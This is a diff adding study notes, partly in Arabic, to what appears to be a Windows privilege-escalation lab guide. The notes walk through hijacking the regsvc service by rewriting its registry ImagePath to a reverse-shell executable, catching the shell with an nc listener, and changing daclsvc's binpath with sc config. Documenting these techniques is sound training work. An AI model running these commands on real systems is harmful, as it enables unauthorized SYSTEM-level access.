@@ -529,6 +529,185 @@ copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
 - <details>
       <summary> Weak Registry Permissions</summary>
 
+     
+     
+     > ## in windows each service has settings stored in `Registry` like:
+     > - **`SERVICE_START_NAME`** : who run the service
+     > - **`BINARY_PATH_NAME`** : the excutable file that run when this service run
+     
+     
+     ## 1. first get info about the service (regsvc):
+     
+     ```ruby
+     sc qc regsvc
+     ```
+     
+     ```c
+       BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
+       SERVICE_START_NAME : LocalSystem
+     ```
+     
+     
+     <img width="836" height="255" alt="image" src="https://github.com/user-attachments/assets/5019fb82-41c1-45f7-8983-dcd88310af44" />
+     
+     
+     ## 2. check the privilege of this user to wirte on **`Registry`**
+     
+     ```ruby
+     C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+     ```
+     
+     ```perl
+     RW NT AUTHORITY\INTERACTIVE
+           KEY_ALL_ACCESS
+     ```
+     
+     ### - `that is mean any user have access to write on registry key of this service`
+     
+     
+     <img width="797" height="192" alt="image" src="https://github.com/user-attachments/assets/88afff65-8a8a-4eaf-b3ad-ddc0cfedfbe0" />
+     
+     
+     
+     ## 3. edit Registry value and make it refer to our reverseshell file
+     
+     ```ruby
+     reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+     ```
+     
+     - **`/v ImagePath`** : It determines that we change this particular value.
+     - **`/t REG_EXPAND_SZ`** : Value type (String extended).
+     - **`/d C:\PrivEsc\reverse.exe`** : New data (new path).
+     - **`/f`** : (to not ask you for confirmation).
+      
+     
+     ## 4. open Listener on kali
+     
+     ```ruby
+     nc -nvlp 4444
+     ```
+     
+     
+     ## 5. run the service
+     
+     ```ruby
+     net start regsvc
+     ```
+     
+     
+     <img width="995" height="568" alt="image" src="https://github.com/user-attachments/assets/0ae50a32-d149-46f3-98a6-4e17d9175224" />
+     
+
+
+     <details>
+        <summary>الفرق بين daclsvc و regsvc Exploits</summary>
+     
+     
+     
+     
+     
+     ## الفرق بين daclsvc و regsvc Exploits
+     
+     
+     الـ 2 إكسبلويت شبيهين في النتيجة (تشغيل ملفنا كـ SYSTEM)، لكن الاختلاف في **إيه اللي اتحكمنا فيه وإزاي**:
+     
+     ### 1️⃣ أول exploit (daclsvc)
+     
+     الأوامر:
+     
+     ```cmd
+     sc qc daclsvc
+     sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+     net start daclsvc
+     ```
+     
+     * الخدمة أصلاً كانت بتشاور على ملف EXE في الـ `binpath`.
+     * اليوزر عنده **SERVICE\_CHANGE\_CONFIG** → يقدر يعدّل إعدادات الخدمة باستخدام `sc config`.
+     * غيّرنا الـ **binpath** بتاع الخدمة وخليّناه يشاور على ملفنا (reverse.exe).
+     * لما شغّلنا الخدمة → الملف بتاعنا اتنفذ كـ SYSTEM.
+     
+     **الخلاصة**: استغلال صلاحية "تغيير إعدادات الخدمة" (config).
+     
+     ### 2️⃣ تاني exploit (regsvc)
+     
+     الأوامر:
+     
+     ```cmd
+     accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+     reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+     net start regsvc
+     ```
+     
+     * الخدمة (regsvc) بتشاور على المسار بتاعها من الريجستري (`ImagePath`).
+     * عندنا صلاحية **كتابة على مفتاح الريجستري** ده (مش config بتاع الخدمة نفسها).
+     * بدلنا قيمة الـ `ImagePath` في الريجستري وخليّناه يشاور على `reverse.exe`.
+     * لما شغّلنا الخدمة → برضه ملفنا اتنفذ كـ SYSTEM.
+     
+     **الخلاصة**: استغلال صلاحية "كتابة في الريجستري" بدل "تغيير إعدادات الخدمة".
+     
+     ### الفرق الرئيسي:
+     
+     * **daclsvc**: عدّلنا إعدادات الخدمة باستخدام أمر `sc config` (بسبب صلاحية خدمة).
+     * **regsvc**: عدّلنا **الريجستري** اللي الخدمة بتسحب منه الإعدادات (بسبب صلاحية على الريجستري).
+     
+     ---
+     
+     ## جدول مقارنة بين أنواع Service Exploits
+     
+     | نوع الاستغلال                 | المكان/الصلاحية المطلوب  | الطريقة                              | النتيجة                               |
+     | ----------------------------- | ------------------------ | ------------------------------------ | ------------------------------------- |
+     | DACL / Config Exploit         | SERVICE\_CHANGE\_CONFIG  | sc config تغيير binpath              | تشغيل ملف كـ SYSTEM                   |
+     | Registry Exploit              | Write على Registry       | reg add لتغيير ImagePath             | تشغيل ملف كـ SYSTEM                   |
+     | Unquoted Path Exploit         | Write على مجلد الخدمة    | وضع ملف باسم معين داخل مجلد غير مقفل | تشغيل الملف بصلاحيات SYSTEM عند start |
+     | AlwaysInstallElevated Exploit | سياسات Windows Installer | تثبيت MSI خبيث                       | تشغيل كـ SYSTEM                       |
+     | Weak Service Permissions      | أذونات ضعيفة على الخدمة  | sc config / binpath                  | تشغيل كـ SYSTEM                       |
+     
+     *ملاحظة*: كل الطرق السابقة تعتمد على أن الخدمة تعمل تحت SYSTEM أو حساب عالي الصلاحيات.
+     
+     
+     ---
+
+
+     # Windows Service Paths Explained
+     
+     ## 1️⃣ BINARY_PATH_NAME
+     - ده الـ **path الحقيقي** للـ executable اللي السيرفيس هيشغله.
+     - لما تعمل `sc config <service> binpath= "..."`، أنت فعليًا بتغير **المكان اللي النظام هيشغل منه البرنامج**.
+     - أي تغيير هنا بيأثر على السيرفيس فورًا بعد إعادة التشغيل.
+     
+     ## 2️⃣ ImagePath
+     - ده موجود في **Registry** تحت المسار:
+       ```
+       HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<ServiceName>
+       ```
+     - القيمة دي هي نفسها `BINARY_PATH_NAME`، لأنها مجرد **طريقة Windows لتخزين path السيرفيس** في الريجستري.
+     - عمليًا هما بيشاوروا لنفس الملف، لكن `ImagePath` موجود في الريجستري، و`BINARY_PATH_NAME` بيشتغل بيه `sc.exe`.
+     
+     ## 3️⃣ العلاقة بينهم
+     - لو غيرت `BINARY_PATH_NAME` عن طريق `sc config` → النظام بيحدث الـ `ImagePath` في الريجستري تلقائي.
+     - لو غيرت `ImagePath` مباشرة في الريجستري → السيرفيس مش هيعرف لحد ما تعمله restart أو تستخدم `sc` لتحديثه.
+     
+     ## 4️⃣ ليه في Exploit غيرنا `binpath`؟
+     - الهدف كان **تشغيل الـ reverse shell الخاص بينا كخدمة**.
+     - الأمر المستخدم:
+       ```
+       sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+       ```
+     - ده بيخلي السيرفيس يشتغل بالـ executable بتاعنا بدل الأصلي.
+     - وده أساسي في **privilege escalation** على Windows لأن السيرفيس بيشتغل بـ SYSTEM privileges.
+     
+     ## مثال تشبيهي
+     - تخيل عندك دفتر (Registry) وورقة (BINARY_PATH_NAME) فيها نفس الرقم:
+       - لو كتبت الرقم في الورقة → الدفتر بيتحدث تلقائي.
+       - لو كتبت الرقم في الدفتر بس → الورقة مش هتعرف إلا لما تقول لها "حدّثي نفسك" (restart أو `sc`).
+     
+     
+          
+     
+     
+     
+     
+     </details>
 
 
 
@@ -551,7 +730,7 @@ copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
 
 
 - <details>
-      <summary></summary>
+      <summary>Insecure Service Executables</summary>
   </details>
   
 
